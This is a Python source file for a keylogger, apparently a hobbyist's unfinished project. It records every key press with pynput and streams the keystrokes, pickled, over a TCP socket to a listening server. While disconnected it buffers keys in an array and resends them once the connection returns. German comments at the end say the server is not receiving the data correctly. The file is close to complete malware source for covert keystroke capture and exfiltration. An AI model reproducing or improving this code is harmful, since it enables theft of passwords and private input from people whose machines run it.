from pynput.keyboard import Listener
import socket
from pickle import dumps


class Global:
    key_array = []
    i = 0
    connection = False


class Socket:

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.connect((socket.gethostname(), 50000))
            Global.connection = True
        except ConnectionRefusedError:
            pass

    def send(self, char):
        char = dumps(char)
        if self.socket:
            try:
                self.socket.sendall(char)
                return True
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                return False
        else:
            return False

    def send_array(self, array):
        if Global.connection:
            array = dumps(array)
            try:
                self.socket.sendall(array)
                print("send")
                Global.connection = True
            except(ConnectionResetError, ConnectionAbortedError, OSError):
                Global.connection = False

    def reconnect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.connect((socket.gethostname(), 1234))
            Global.connection = True
        except socket.error:
            pass


def no_safe_key_press(key):
    key = str(key).replace("'", "")
    send = active.send(key)
    if not send:
        Global.key_array.append(key)
        Global.connection = False
        return False


def safe_key_press(key):
    key = str(key).replace("'", "")
    Global.key_array.append(key)
    Global.i += 1
    if Global.i == 100:
        Global.i = 0
        return False


while True:
    active = Socket()
    if Global.connection and not Global.key_array:
        with Listener(on_press=no_safe_key_press)as f:
            f.join()
        continue

    elif Global.connection and Global.key_array:
        active.send_array(Global.key_array)
        Global.key_array = []
        continue

    elif not Global.connection:
        with Listener(on_press=safe_key_press)as f:
            f.join()
        continue


#Enpfängt data nicht richtig
#Wenn Array nicht abgeschickt wird bekommt server daten trozdem nicht